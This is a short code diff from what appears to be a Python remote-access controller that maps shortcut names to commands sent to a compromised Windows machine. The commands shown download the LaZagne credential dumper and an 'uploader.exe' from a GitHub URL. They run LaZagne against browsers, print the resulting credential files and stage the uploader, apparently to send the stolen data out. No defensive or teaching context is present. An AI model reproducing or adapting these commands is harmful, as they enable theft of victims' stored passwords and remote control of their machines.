@@ -48,7 +48,7 @@ while True:
 	elif command_to_send == "passwords1.5":
 		command_to_send = 'powershell;Invoke-WebRequest -Uri "https://github.com/jonathanbreitg/dump/blob/main/lazagne.exe?raw=true" -OutFile "lazagne.exe'
 	elif command_to_send == "passwords2":
-		command_to_send = 'cmd start cmd /c lazagne.exe browsers -oN -output asd;'
+		command_to_send = 'start cmd /c lazagne.exe browsers -oN -output asd;'
 	elif command_to_send == "passwords3":
 		command_to_send = 'powershell type cred*.txt;powershell start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/uploader.exe?raw=true" -destination "uploader.exe"'
 	elif command_to_send == "passwords4":
